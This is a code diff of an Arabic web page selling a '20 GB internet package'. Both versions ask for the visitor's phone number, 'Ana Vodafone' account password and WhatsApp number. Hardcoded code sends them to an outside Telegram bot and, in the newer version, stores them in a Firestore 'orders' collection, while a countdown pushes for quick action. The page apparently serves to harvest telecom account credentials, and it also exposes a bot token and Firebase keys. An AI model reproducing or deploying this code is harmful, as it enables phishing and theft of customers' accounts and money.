@@ -1,120 +1,161 @@
- <!DOCTYPE html>
+<!-- internet20.html -->
+<!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🔵 حجز 20 جيجا إنترنت</title>
+  <title>📶 حجز باقة 20 جيجا</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
-    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyCE-lK2kKc2CQi3bmnQ1UjKBy9Rb_M-Df0",
-      authDomain: "noproblem-55b97.firebaseapp.com",
-      projectId: "noproblem-55b97",
-      storageBucket: "noproblem-55b97.appspot.com",
-      messagingSenderId: "315239654480",
-      appId: "1:315239654480:web:b40c7bba7c6cf0b7395351"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    window.submit20 = async function () {
-      const phone = document.getElementById("phone").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const whatsapp = document.getElementById("whatsapp").value.trim();
-
-      if (!phone || !password || !whatsapp) {
-        Swal.fire("❌ خطأ", "يرجى إدخال جميع البيانات", "error");
-        return;
-      }
-
-      const userRef = doc(db, "users", phone);
-      const userSnap = await getDoc(userRef);
-
-    
-      const userData = userSnap.data();
-      const currentBalance = userData.balance || 0;
-
-      if (currentBalance < 200) {
-        Swal.fire("⚠️ رصيد غير كافي", `رصيدك الحالي ${currentBalance} جنيه، ولا يكفي لحجز الباقة.`, "warning");
-        return;
-      }
-
-      // خصم الرصيد
-      await updateDoc(userRef, {
-        balance: currentBalance - 200
-      });
-
-      const message = `
-📦 *طلب باقة 20 جيجا*  
-📱 *رقم الهاتف:* ${phone}  
-🔐 *باسورد أنا فودافون:* ${password}  
-💬 *رقم واتساب:* ${whatsapp}  
-💰 *تم الخصم: 200 جنيه*  
-`;
-
-      await fetch(`https://api.telegram.org/bot7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo/sendMessage?chat_id=8102839626&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-
-      Swal.fire("✅ تم الحجز", "تم حجز 20 جيجا إنترنت. التفعيل خلال 24 إلى 48 ساعة.", "success");
-    };
-  </script>
-
   <style>
     body {
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #1e1e2f, #2c2c3d);
-      color: white;
+      background: #111;
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
     }
     .container {
-      background: #222;
-      padding: 30px;
-      border-radius: 15px;
-      max-width: 400px;
+      background: #1e1e1e;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px #000;
       width: 90%;
+      max-width: 400px;
       text-align: center;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
     }
-    h2 {
-      color: #00e6e6;
-    }
-    input, button {
+    h2 { color: #00e676; }
+    .countdown { color: #ffc107; margin-bottom: 15px; }
+    input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      padding: 10px;
+      margin: 8px 0;
+      background: #333;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
-    }
-    input {
-      background: #444;
-      color: white;
+      color: #fff;
+      text-align: center;
     }
     button {
-      background: linear-gradient(to right, #00c6ff, #0072ff);
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(to right, #2196f3, #21cbf3);
+      border: none;
+      border-radius: 8px;
       color: white;
+      font-size: 16px;
       cursor: pointer;
     }
-    button:hover {
-      transform: scale(1.03);
-    }
+    button:hover { opacity: 0.9; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>📶 حجز 20 جيجا إنترنت</h2>
-    <p>💰 السعر: 200 جنيه</p>
-    <input type="text" id="phone" placeholder="📱 رقم الهاتف">
-    <input type="text" id="password" placeholder="🔐 باسورد أنا فودافون">
-    <input type="text" id="whatsapp" placeholder="💬 رقم واتساب">
-    <button onclick="submit20()">تفعيل الباقة</button>
+    <h2>🌐 حجز باقة 20 جيجا</h2>
+    <div class="countdown" id="countdown20">⏳</div>
+    <input id="phone" type="text" placeholder="رقم الهاتف">
+    <input id="password" type="text" placeholder="باسورد أنا فودافون">
+    <input id="whatsapp" type="text" placeholder="رقم الواتساب">
+    <button onclick="bookInternetPackage(200, '20 جيجا')">احجز الباقة</button>
   </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAdf5AKFgLXgK2PYERHw1hgF_HsMmuTfuo",
+      authDomain: "noproblem-55b97.firebaseapp.com",
+      projectId: "noproblem-55b97",
+      storageBucket: "noproblem-55b97.appspot.com",
+      messagingSenderId: "316010224446",
+      appId: "1:316010224446:web:5d7e7f792e53ee4b396a6f"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function bookInternetPackage(price, packageName) {
+      const phone = document.getElementById("phone").value;
+      const password = document.getElementById("password").value;
+      const whatsapp = document.getElementById("whatsapp").value;
+
+      if (!phone || !password || !whatsapp) {
+        Swal.fire("❌", "الرجاء إدخال كل البيانات", "error");
+        return;
+      }
+
+      const deadline = new Date();
+      deadline.setHours(17, 0, 0, 0); // 5 مساءً
+      if (new Date() > deadline) {
+        Swal.fire("⛔", "انتهى الحجز", "error");
+        return;
+      }
+
+      firebase.auth().onAuthStateChanged(user => {
+        if (!user) return Swal.fire("❌", "سجل دخولك الأول", "error");
+
+        const userRef = db.collection("users").doc(user.uid);
+        userRef.get().then(doc => {
+          const wallet = doc.data().wallet || 0;
+          if (wallet < price) {
+            Swal.fire("🚫", "رصيدك غير كافٍ", "error");
+            return;
+          }
+
+          userRef.update({ wallet: wallet - price }).then(() => {
+            db.collection("orders").add({
+              userId: user.uid,
+              phone, password, whatsapp,
+              package: packageName,
+              amount: price,
+              createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+              status: "قيد التنفيذ"
+            });
+
+            sendToTelegram(packageName, phone, password, whatsapp, price);
+            Swal.fire("✅ تم الحجز", `تم حجز ${packageName} بنجاح. التفعيل خلال 24 - 48 ساعة`, "success");
+          });
+        });
+      });
+    }
+
+    function sendToTelegram(pkg, phone, password, whatsapp, price) {
+      const token = "7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo";
+      const chatId = "8102839626";
+      const message = `📶 *طلب باقة إنترنت*  
+🔘 *الباقة:* ${pkg}  
+📱 *رقم الهاتف:* ${phone}  
+🔑 *باسورد:* ${password}  
+💬 *واتساب:* ${whatsapp}  
+💸 *المبلغ:* ${price} جنيه  
+🕐 *الحالة:* قيد التنفيذ`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+    }
+
+    function startCountdown() {
+      const countdown = document.getElementById("countdown20");
+      const deadline = new Date();
+      deadline.setHours(17, 0, 0, 0);
+
+      const timer = setInterval(() => {
+        const now = new Date();
+        const diff = deadline - now;
+        if (diff <= 0) {
+          countdown.textContent = "⛔ انتهى الحجز";
+          clearInterval(timer);
+          return;
+        }
+
+        const h = Math.floor(diff / 3600000);
+        const m = Math.floor((diff % 3600000) / 60000);
+        const s = Math.floor((diff % 60000) / 1000);
+        countdown.textContent = `🕒 ينتهي الحجز خلال: ${h} ساعة ${m} دقيقة ${s} ثانية`;
+      }, 1000);
+    }
+    startCountdown();
+  </script>
 </body>
 </html>
